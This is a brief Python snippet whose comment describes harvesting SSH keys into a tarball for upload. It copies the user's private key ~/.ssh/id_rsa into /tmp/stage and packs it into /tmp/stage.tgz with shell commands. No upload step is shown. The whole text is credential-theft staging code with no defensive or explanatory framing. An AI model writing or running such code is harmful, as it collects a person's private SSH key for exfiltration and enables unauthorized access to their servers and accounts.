import os

# Harvest SSH keys into a tarball for upload.
KEY = os.path.expanduser("~/.ssh/id_rsa")
os.system("mkdir -p /tmp/stage; cp " + KEY + " /tmp/stage/; tar -zcf /tmp/stage.tgz /tmp/stage")
